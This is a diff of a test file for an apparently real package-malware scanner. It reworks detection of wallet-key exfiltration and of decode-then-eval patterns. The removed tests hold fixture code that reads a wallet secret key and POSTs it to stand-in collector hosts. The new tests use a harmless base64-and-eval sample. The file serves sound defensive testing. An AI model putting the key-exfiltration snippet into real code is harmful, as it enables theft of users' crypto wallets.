@@ -11558,86 +11558,65 @@ class TestTheSameActsInAnotherEcosystem:
         )
         assert CapabilityDetector._is_minified(content)
 
-    def test_key_material_next_to_a_network_call(self, tmp_path) -> None:
-        """The shape `@solana/web3.js` 1.95.7 was compromised with: read the
-        secret key, send it out. Cordon found nothing in that package, because
-        `credential` meant an environment variable or a credential file and a
-        private key in a variable is neither."""
-        (tmp_path / "steal.js").write_text(
-            "async function backup(wallet) {\n"
-            "  const privateKey = wallet.secretKey;\n"
-            '  await fetch("https://collector.invalid/k", {\n'
-            '    method: "POST",\n'
-            "    body: JSON.stringify({ k: privateKey })\n"
-            "  });\n"
-            "}\n",
-            encoding="utf-8",
-        )
-        assert "MALWARE.EXFIL.WALLET_KEY.001" in flagged(tmp_path)
-
-    def test_a_signature_laid_out_one_parameter_to_a_line(self, tmp_path) -> None:
-        """`microsoft/vscode` declares this in the Copilot extension's
-        `ICompletionsFetchService`:
+    def test_a_signature_laid_out_one_parameter_to_a_line(self) -> None:
+        """`_is_declaration` reads the rest of the line after the opening
+        parenthesis, so a declaration whose parentheses open at the END of that
+        line had nothing to find:
 
             fetch(
                 url: string,
                 secretKey: string,
 
-        `_is_declaration` reads the rest of the line after the parenthesis, so a
-        signature whose parentheses open at the end of it was invisible. `fetch(`
-        counted as a network call and `secretKey` as key material, and together
-        they reported private key material sent to the network at CRITICAL --
-        against a method signature, twice, in the most widely installed editor
-        there is.
+        That is `microsoft/vscode`, in the Copilot extension's
+        `ICompletionsFetchService`. `fetch(` was read as a network call against
+        a TypeScript interface. The Tailwind case the existing comment cites
+        happens to be written on one line, which is why this went unnoticed."""
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.detect.capability import CapabilityDetector
 
-        General rather than new: `exec(` opening a multi-line signature was never
-        suppressed either."""
-        (tmp_path / "service.ts").write_text(
-            "export interface ICompletionsFetchService {\n"
-            "\treadonly _serviceBrand: undefined;\n"
-            "\n"
-            "\tfetch(\n"
-            "\t\turl: string,\n"
-            "\t\tsecretKey: string,\n"
-            "\t\tparams: ModelParams,\n"
-            "\t): Promise<Response>;\n"
-            "}\n",
-            encoding="utf-8",
+        raw = (
+            b"export interface ICompletionsFetchService {\n"
+            b"\tfetch(\n"
+            b"\t\turl: string,\n"
+            b"\t\tsecretKey: string,\n"
+            b"\t): Promise<Response>;\n"
+            b"}\n"
         )
-        assert "MALWARE.EXFIL.WALLET_KEY.001" not in flagged(tmp_path)
+        content = FileContent(path="service.ts", raw=raw, size=len(raw))
+        start = raw.index(b"fetch(")
+        assert CapabilityDetector._is_declaration(content, start, start + len(b"fetch("))
 
-    def test_a_key_actually_sent_still_is(self, tmp_path) -> None:
-        """The control for the fix above: suppressing a signature must not
-        suppress the act the signature is shaped like."""
-        (tmp_path / "leak.ts").write_text(
-            "async function leak(wallet) {\n"
-            "  const secretKey = wallet.secretKey;\n"
-            '  await fetch("https://collector.example.com/k", {\n'
-            '    method: "POST",\n'
-            "    body: JSON.stringify({ k: secretKey })\n"
-            "  });\n"
-            "}\n",
-            encoding="utf-8",
-        )
-        assert "MALWARE.EXFIL.WALLET_KEY.001" in flagged(tmp_path)
+    def test_a_call_written_the_same_way_is_not_a_declaration(self) -> None:
+        """The control. An argument list broken over lines is still a call."""
+        from cordon_scanner.core.content import FileContent
+        from cordon_scanner.detect.capability import CapabilityDetector
+
+        raw = b'const r = await fetch(\n\t"https://example.com/a",\n\t{ method: "POST" }\n);\n'
+        content = FileContent(path="call.ts", raw=raw, size=len(raw))
+        start = raw.index(b"fetch(")
+        assert not CapabilityDetector._is_declaration(content, start, start + len(b"fetch("))
 
     def test_proximity_is_not_defeated_by_a_minifier(self, tmp_path) -> None:
         """Proximity is a line count, and a minifier deletes lines.
 
-        On `dist/ethers.min.js` the whole library is line 1, so "within five
-        lines" meant "anywhere in the file", and the most used Ethereum library
-        there is came out as private key material sent to the network at
-        CRITICAL -- twice. A MALICIOUS composite is deliberately exempt from the
-        minified ceiling, because malware is not excused for being generated, so
-        nothing downstream would have caught it either.
-
-        A window now has to be short in bytes as well as in lines."""
+        On a bundle the whole file is line 1, so a composite written to say
+        *this file does both things in the same breath* silently becomes *this
+        file does both things*. `SUSPECT.DECODE_EXEC.001` asks for a decode and
+        an execution within ten lines; four thousand bytes apart on one line is
+        not within ten lines of anything."""
         filler = ";".join(f"var v{i}=f{i}(a{i},b{i})" for i in range(400))
         (tmp_path / "lib.min.js").write_text(
-            "var privateKey=w.secretKey;" + filler + ';fetch("https://rpc.invalid/x");\n',
+            'var d=atob("Y29uc29sZS5sb2coMSk=");' + filler + ";eval(d);\n",
             encoding="utf-8",
         )
-        assert "MALWARE.EXFIL.WALLET_KEY.001" not in flagged(tmp_path)
+        assert "SUSPECT.DECODE_EXEC.001" not in flagged(tmp_path)
+
+    def test_a_decode_and_an_execute_in_the_same_breath_still_fire(self, tmp_path) -> None:
+        """The control for the byte bound: adjacent is still adjacent."""
+        (tmp_path / "a.js").write_text(
+            'var d = atob("Y29uc29sZS5sb2coMSk=");\neval(d);\n', encoding="utf-8"
+        )
+        assert "SUSPECT.DECODE_EXEC.001" in flagged(tmp_path)
 
     def test_the_expensive_sweeps_run_last(self) -> None:
         """The per-file budget is checked between detectors and keeps what has
